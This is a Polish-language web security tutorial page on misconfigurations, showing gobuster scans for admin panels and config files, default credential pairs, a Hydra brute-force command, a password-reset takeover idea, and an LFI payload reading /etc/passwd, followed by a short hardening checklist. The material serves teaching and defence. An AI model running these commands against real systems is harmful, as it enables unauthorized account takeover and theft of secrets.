---
id: "security-misconfigurations"
title: "⚠️ Security Misconfigurations i ataki na pliki"
sidebar_position: 11
---

# ⚠️ Security Misconfigurations i ataki na pliki

Błędne konfiguracje systemów i serwerów mogą prowadzić do przejęcia dostępu do aplikacji, eskalacji uprawnień oraz wycieku wrażliwych danych. W tej sekcji omówimy, jak wykorzystać tego typu podatności oraz jak się przed nimi zabezpieczyć.

---

## 🔥 Przejmowanie kont administratora

### **1️⃣ Ataki na panele administracyjne**
Brak odpowiednich zabezpieczeń w panelach administracyjnych może prowadzić do przejęcia konta administratora.

#### **1.1 Wyszukiwanie ukrytych paneli admina**
Można użyć narzędzi takich jak `gobuster`:
```bash
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
```
Przykładowe lokalizacje paneli admina:
- `/admin`
- `/wp-admin`
- `/login`
- `/cms`

#### **1.2 Domyślne dane logowania**
Wiele aplikacji webowych posiada domyślne hasła, które nie zostały zmienione.

Popularne loginy/hasła:
```
admin:admin
root:root
test:test
admin:password
```
Można sprawdzić, czy aplikacja jest podatna, wykorzystując `Hydra`:
```bash
hydra -L users.txt -P passwords.txt example.com http-post-form "/admin:username=^USER^&password=^PASS^:F=incorrect"
```

#### **1.3 Przejęcie konta poprzez reset hasła**
Niektóre aplikacje nie sprawdzają, czy użytkownik ma dostęp do adresu e-mail, na który wysyłany jest link resetujący hasło. Można to przetestować, przechwytując żądanie resetu w Burp Suite i zmieniając wartość `email` na e-mail administratora.

---

## 🛠️ Wykorzystanie błędnych ustawień serwerów

### **2️⃣ Odczytywanie plików konfiguracyjnych**
Niepoprawnie skonfigurowane serwery mogą umożliwiać dostęp do plików konfiguracyjnych zawierających hasła, klucze API i inne poufne dane.

#### **2.1 Wyszukiwanie plików konfiguracyjnych**
Lista często odsłoniętych plików:
```
/.env
/config.php
/config.json
/database.yml
/.git/
```
Skanowanie za pomocą `gobuster`:
```bash
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,env,json,yml
```

#### **2.2 Odczyt plików poprzez LFI (Local File Inclusion)**
Jeśli aplikacja ma podatność na LFI, można odczytać poufne pliki:
```http
http://example.com/index.php?file=../../../../etc/passwd
```

Testowanie LFI w `ffuf`:
```bash
ffuf -u "http://example.com/index.php?file=FUZZ" -w wordlist.txt
```

#### **2.3 Niezabezpieczone katalogi**
Niektóre serwery umożliwiają listowanie katalogów, co pozwala na pobieranie plików.

Sprawdzenie w przeglądarce:
```
http://example.com/uploads/
http://example.com/backups/
```
Można też użyć `wget` do pobrania całej zawartości:
```bash
wget -r http://example.com/uploads/
```

---

## 🔐 Jak zabezpieczyć aplikację przed błędnymi konfiguracjami?
✅ **Zmień domyślne dane logowania** – nigdy nie używaj `admin:admin`.
✅ **Ogranicz dostęp do paneli admina** – stosuj IP Whitelisting i MFA.
✅ **Zablokuj dostęp do wrażliwych plików** – np. `.env`, `config.php`.
✅ **Wyłącz listowanie katalogów** w konfiguracji serwera.
✅ **Monitoruj logi serwera** – wykrywaj nietypowy ruch w logach Apache/Nginx.

---

Błędne konfiguracje są jednym z najczęstszych powodów udanych ataków na aplikacje. Kolejnym krokiem będzie analiza podatności **Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)**! 🚀
